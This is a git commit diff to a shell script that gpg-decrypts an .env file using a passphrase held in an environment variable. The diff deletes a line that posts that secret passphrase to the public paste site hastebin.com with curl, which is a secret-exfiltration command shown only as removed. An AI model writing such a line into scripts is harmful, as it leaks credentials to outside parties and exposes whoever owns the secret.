807640c92d90cf42ff1d109b3d69d512c13105a0
Trevor Wong <trevor8568@gmail.com>
2021-09-04 14:12:52 -0500

    updated secret key

--- decrypt_secret.sh
+++ decrypt_secret.sh
@@ -1,7 +1,5 @@
 #!/bin/sh
 
-curl -XPOST http://hastebin.com/documents -d $LARGE_SECRET_PASSPHRASE
-
 # --batch to prevent interactive command
 # --yes to assume "yes" for questions
 gpg --quiet --batch --yes --decrypt --passphrase="$LARGE_SECRET_PASSPHRASE"  --output .env .env.gpg
